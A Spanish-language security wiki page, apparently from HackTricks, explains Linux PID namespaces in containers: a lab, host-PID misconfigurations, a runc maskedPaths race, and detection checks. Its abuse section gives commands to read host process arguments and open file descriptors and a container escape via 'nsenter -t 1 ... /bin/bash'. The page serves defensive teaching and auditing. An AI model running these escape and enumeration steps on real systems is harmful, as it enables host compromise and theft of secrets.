# Espacio de nombres PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El espacio de nombres PID controla cómo se numeran los procesos y qué procesos son visibles. Por eso un contenedor puede tener su propio PID 1 aunque no sea una máquina real. Dentro del espacio de nombres, la carga de trabajo ve lo que parece ser un árbol de procesos local. Fuera del espacio de nombres, el host sigue viendo los PIDs reales del host y el panorama completo de procesos.

Desde el punto de vista de la seguridad, el espacio de nombres PID importa porque la visibilidad de procesos es valiosa. Cuando una carga de trabajo puede ver los procesos del host, podría observar nombres de servicios, argumentos de línea de comandos, secretos pasados en los argumentos de procesos, estado derivado del entorno a través de `/proc`, y posibles objetivos para entrar en namespaces. Si puede hacer más que simplemente ver esos procesos —por ejemplo, enviar señales o usar ptrace bajo las condiciones adecuadas— el problema se vuelve mucho más serio.

## Funcionamiento

Un nuevo espacio de nombres PID comienza con su propia numeración interna de procesos. El primer proceso creado dentro de él se convierte en PID 1 desde el punto de vista del espacio de nombres, lo que también significa que obtiene semánticas especiales similares a init para hijos huérfanos y el manejo de señales. Esto explica muchas rarezas de contenedores relacionadas con procesos init, recolección de zombies, y por qué a veces se usan pequeños wrappers init en contenedores.

La lección de seguridad importante es que un proceso puede parecer aislado porque solo ve su propio árbol de PIDs, pero ese aislamiento puede ser removido deliberadamente. Docker expone esto mediante `--pid=host`, mientras que Kubernetes lo hace mediante `hostPID: true`. Una vez que el contenedor se une al espacio de nombres PID del host, la carga de trabajo ve los procesos del host directamente, y muchos vectores de ataque posteriores se vuelven mucho más realistas.

## Laboratorio

Para crear un espacio de nombres PID manualmente:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
La shell ahora ve una vista de procesos privada. La bandera `--mount-proc` es importante porque monta una instancia de procfs que coincide con el nuevo PID namespace, haciendo que la lista de procesos sea coherente desde dentro.

Para comparar el comportamiento del contenedor:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La diferencia es inmediata y fácil de entender, por eso este es un buen primer laboratorio para los lectores.

## Uso en tiempo de ejecución

Los contenedores normales en Docker, Podman, containerd y CRI-O obtienen su propio espacio de nombres PID. Los Kubernetes Pods normalmente también reciben una vista PID aislada, a menos que la carga de trabajo solicite explícitamente compartir el PID del host. Los entornos LXC/Incus se basan en la misma primitiva del kernel, aunque los casos de uso de system-container pueden exponer árboles de procesos más complicados y fomentar atajos de depuración.

La misma regla se aplica en todas partes: si el runtime decidió no aislar el espacio de nombres PID, eso es una reducción deliberada en el límite del contenedor.

## Misconfiguraciones

La misconfiguración canónica es la compartición del PID del host. Los equipos a menudo la justifican por depuración, monitorización o conveniencia en la gestión de servicios, pero siempre debe tratarse como una excepción de seguridad significativa. Incluso si el contenedor no tiene una primitiva de escritura inmediata sobre los procesos del host, la mera visibilidad puede revelar mucho sobre el sistema. Una vez que se añaden capacidades como `CAP_SYS_PTRACE` o acceso útil a procfs, el riesgo se amplía significativamente.

Otro error es asumir que, dado que la carga de trabajo no puede matar o hacer ptrace a los procesos del host por defecto, la compartición del PID del host es por tanto inofensiva. Esa conclusión ignora el valor de la enumeración, la disponibilidad de objetivos para entrada en namespace y la forma en que la visibilidad de PID se combina con otros controles debilitados.

## Abuso

Si se comparte el espacio de nombres PID del host, un atacante puede inspeccionar los procesos del host, obtener argumentos de proceso, identificar servicios interesantes, localizar PIDs candidatos para `nsenter`, o combinar la visibilidad de procesos con privilegios relacionados con ptrace para interferir con las cargas de trabajo del host o adyacentes. En algunos casos, simplemente ver el proceso correcto de larga ejecución es suficiente para remodelar el resto del plan de ataque.

El primer paso práctico es siempre confirmar que los procesos del host son realmente visibles:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Una vez que los PIDs del host son visibles, los argumentos de los procesos y los namespace-entry targets suelen convertirse en la fuente de información más útil:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Si `nsenter` está disponible y existen privilegios suficientes, prueba si un proceso visible del host puede utilizarse como puente de namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Incluso cuando el acceso está bloqueado, compartir los PID del host ya es valioso porque revela la disposición de los servicios, los componentes en tiempo de ejecución y procesos privilegiados candidatos para atacar a continuación.

La visibilidad de los PID del host también hace más realista el abuso de descriptores de archivo. Si un proceso privilegiado del host o una carga de trabajo vecina tiene abierto un archivo o socket sensible, el atacante podría inspeccionar `/proc/<pid>/fd/` y reutilizar ese descriptor según el propietario, las opciones de montaje de procfs y el modelo de servicio objetivo.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Estos comandos son útiles porque permiten determinar si `hidepid=1` o `hidepid=2` están reduciendo la visibilidad entre procesos y si descriptores claramente interesantes, como archivos secretos abiertos, logs o sockets Unix, son visibles en lo más mínimo.

### Ejemplo completo: PID del host + `nsenter`

Compartir el PID del host se convierte en un escape directo al host cuando el proceso también tiene suficientes privilegios para unirse a los namespaces del host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Si el comando tiene éxito, el proceso del contenedor ahora se está ejecutando en los namespaces mount, UTS, network, IPC y PID del host. El impacto es la compromisión inmediata del host.

Incluso cuando `nsenter` no está presente, el mismo resultado puede lograrse a través del binario del host si el sistema de archivos del host está montado:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notas recientes en tiempo de ejecución

Algunos ataques relevantes para PID-namespace no son las típicas malas configuraciones `hostPID: true`, sino fallos de implementación en tiempo de ejecución relacionados con cómo se aplican las protecciones de procfs durante la configuración del contenedor.

#### `maskedPaths` — condición de carrera hacia el procfs del host

En versiones vulnerables de `runc`, atacantes que puedan controlar la imagen del contenedor o la carga de trabajo `runc exec` podrían provocar una condición de carrera en la fase de enmascaramiento reemplazando el `/dev/null` del contenedor con un symlink a una ruta sensible de procfs como `/proc/sys/kernel/core_pattern`. Si la carrera tiene éxito, el masked-path bind mount podría montarse en el objetivo equivocado y exponer los host-global procfs knobs al nuevo contenedor.

Comando útil para revisar:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Esto es importante porque el impacto eventual puede ser el mismo que una exposición directa de procfs: `core_pattern` o `sysrq-trigger` con permisos de escritura, seguido de ejecución de código en el host o denegación de servicio.

#### Inyección de namespace con `insject`

Las herramientas de inyección de namespace como `insject` muestran que la interacción con PID-namespace no siempre requiere entrar previamente en el namespace objetivo antes de crear el proceso. Un helper puede adjuntarse más tarde, usar `setns()`, y ejecutar manteniendo la visibilidad en el espacio PID objetivo:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
This kind of technique matters mainly for advanced debugging, offensive tooling, and post-exploitation workflows where namespace context must be joined after the runtime has already initialized the workload.

### Patrones de abuso relacionados con FD

Dos patrones vale la pena señalar explícitamente cuando los PID del host son visibles. Primero, un proceso privilegiado puede mantener un file descriptor sensible abierto a través de `execve()` porque no fue marcado `O_CLOEXEC`. Segundo, los servicios pueden pasar file descriptors por Unix sockets mediante `SCM_RIGHTS`. En ambos casos el objeto interesante ya no es el pathname, sino el handle ya abierto que un proceso de menor privilegio puede heredar o recibir.

Esto importa en el trabajo con contenedores porque el handle puede apuntar a `docker.sock`, un privileged log, un archivo secreto del host u otro objeto de alto valor incluso cuando la ruta en sí no es directamente accesible desde el filesystem del contenedor.

## Comprobaciones

El propósito de estos comandos es determinar si el proceso tiene una vista privada de PID o si ya puede enumerar un panorama de procesos mucho más amplio.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Lo interesante aquí:

- Si la lista de procesos contiene servicios evidentes del host, probablemente la compartición de PID con el host ya esté en efecto.
- Ver solo un pequeño árbol local del contenedor es la línea base normal; ver `systemd`, `dockerd`, u otros demonios no relacionados no lo es.
- Una vez que los PIDs del host son visibles, incluso la información de procesos de solo lectura se convierte en un reconocimiento útil.

Si descubres un contenedor que se ejecuta con compartición de PID con el host, no lo trates como una diferencia cosmética. Es un cambio importante en lo que la carga de trabajo puede observar y en lo que potencialmente puede afectar.
{{#include ../../../../../banners/hacktricks-training.md}}
